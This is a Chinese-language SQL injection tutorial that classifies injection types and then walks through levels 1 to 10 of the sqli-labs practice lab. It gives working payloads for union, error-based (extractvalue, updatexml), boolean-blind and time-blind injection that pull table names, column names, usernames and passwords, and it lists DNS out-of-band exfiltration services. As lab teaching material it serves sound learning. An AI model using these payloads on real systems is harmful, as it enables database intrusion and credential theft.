# SQL注入

## 什么是SQL注入？

#### 通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

## SQL注入分类

SQL注入按照注入点类型来分分为：

　　数字型注入，字符型注入，搜索型注入

SQL中注入按照提交类型来分分为：

　　GET注入，POST注入，COOKIE注入，HTTP头部注入

SQL注入按照技巧分类的话可以分为：

　　联合注入，布尔盲注，时间盲注，堆叠注入，报错注入，二次注入、DNS带外注入其他

### 数字型注入：

​	许多网页链接有类似的结构 xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 select * from 表名 where id=1。

### 字符型注入：

​	网页链接有类似的结构 xxx.com/users.php?name=admin  这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where name='admin' 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。

### 搜索型注入：

​	这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 "keyword=关键字" 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%'。

### Get注入：

提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接xxx.com/news.php?id=1 , id 是注入点。

### POST 注入：

使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。

### Cookie注入：

HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。

### HTTP 头部注入：

注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。

### 联合注入：

利用union进行数据库查询，数据会进行回显，页面有显位符，在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。

### 布尔盲注：true or false bool

盲注则是表示注入过程中数据不会回显，只能根据页面返回两种内容的的不同来判断注入语句判断的内容是否正确。布尔盲注是根据页面的返回的内容是否不同。常用函数：regexp,like,ascii,left,ord,mid,length,substr,right,if。

like 'ro%'            #判断ro或ro...是否成立 
regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
if(条件,5,0)           #条件成立 返回5 反之 返回0
sleep(5)              #SQL语句延时执行5秒
mid(a,b,c)            #从位置b开始，截取a字符串的c位
substr(a,b,c)         #从位置b开始，截取字符串a的c长度 
left(database(),1)，database() #left(a,b)从左侧截取a的前b位 
length(database())=8  #判断数据库database()名的长度
ord=ascii ascii(x)=97 #判断x的ascii码是否等于97

### 时间盲注：

不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行。即通过时间的变化，来观察是否语句是否正确。常用函数：if,sleep。

### 报错注入:

报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。

常用函数：

floor，updatexml，extractvalue

updatexml(1,concat(0x7e,database(),0x7e),1) 

extractvalue(1,concat(0x7e,database(),0x7e))

### 堆叠注入：

将语句堆叠在一起进行查询。支持堆叠数据库类型：MYSQL MSSQL Postgresql等

语句：

';show databases;

';show tables;

### 二次注入：

分为俩部，第一步，插入恶意数据，第一次插入的数据仅仅对其中的特殊字符进行转义，保就是插入的数据包含了恶意语句，但是因为字符进行了转义，数据库识别不到，所以恶意语句先被插入到数据库之中。

第二步，引用第一步插入的恶意语句，在查询时，查询该恶意语句，因为数据库默认已经存在的数据时可信的，所以不会进行检验判断，造成恶意语句的执行。

### DNS带外注入：

DNS平台：

http://www.dnslog.cn

http://admin.dnslog.link

http://ceye.io

有些注入查询不会回显，于是将注入查询的数据，以DNS协议封装出站来显示。



## 靶场-sqli-labs

搭建：https://blog.csdn.net/Joker_Dgh/article/details/123913722

### sqli-labs WP

此靶场时mysql，也是市面上用的广的一款数据库，其他数据库包括mssql,oracle/mongodb,PostgreSql等语句都大同小异，可以进行百度搜索注入的语句。

将mysql的理解好了，其他的数据库注入也能触类旁通。

前置知识：

mysql中，有一个特殊的数据库**information_schema**.

它存储了该数据库下，所有的数据库名，表名，列名。

**information_schema.schemata：记录数据库名的表**

**information_schema.tables：记录表名的表**

**information_schema.columns：记录列名的表**

**table_schema：数据库名称**

**table_name：表名**

**column_name：列名**

### Less-1

Get型注入 用单引号判断存在注入，且报错有回显。**查询结果也会回显则用联合注入**。当然有报错回显可以用报错注入。

```
#下面两步找列数
/Less-1/?id=1' order by 3--+
/Less-1/?id=1' order by 4--+
#确定哪个字段有回显
/Less-1/?id=-1' union select 1,2,3--+ 
#确定当前数据库
/Less-1/?id=-1' union select 1,2,database()--+
#爆出当前数据库内的所有表名
/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
#爆出当前数据库user表的所有列名
/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()--+
#爆出当前数据库user表所有username和password
/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+
```

-1'union 或者 1’ and 1=2

**因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。**

### Less-2

单双引号都报错。看提示语句，判断时数字型注入。payload跟第一关的一样，不过不用引号闭合。

### Less-3

单引号报错，根据提示，需要')来闭合。其余payload和第一关一样。

### Less-4

单引号没有提示，但是双引号报错了，根据报错信息，是"）来闭合，其余payload和第一关一样。

### Less-5

单引号报错，但是俩个引号闭合后，查询结果没有回显。闭合还是单引号。有报错的回显信息。这里采用报错注入。或者布尔盲注。

```
extractvalue函数
and extractvalue(1,concat(0x7e,(database()),0x7e))--+确定当前数据库

and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))--+爆表

and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))--+爆列名
and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users),0x7e))--+爆数据
```

```
updatexml函数
and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 确定数据库

and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)--+爆表

and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1)--+ 爆列名

and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)--+ 爆数据
```

```
and left(database(),1)='s' --+
and ascii(database())=115 --+ 第一位是不是s s的ascii码是115
and ascii(substr(database(),1,1))=115
...
```

### Less-6

和上一关一样，查询结果没有回显，但是这里的闭合方式是"。

### Less-7

首先判断闭合，单引号报错，'--+也报错。说明没闭合好，最后可以爆破，闭合为'))--+。这里报错信息没有回显，则用布尔盲注。

### Less-8

闭合为单引号闭合，这里报错信息也没有回显。所以可以用布尔盲注，这里可以采用时间盲注。

```
and if(left(database(),1)='s',sleep(2),0) --+
...
```

### Less-9

单引号闭合，但这里不管输入正确的还是错误的，都是同一个页面，所以这里只能使用时间盲注。

### Less-10

和上一关不一样的是，使用双引号闭合。
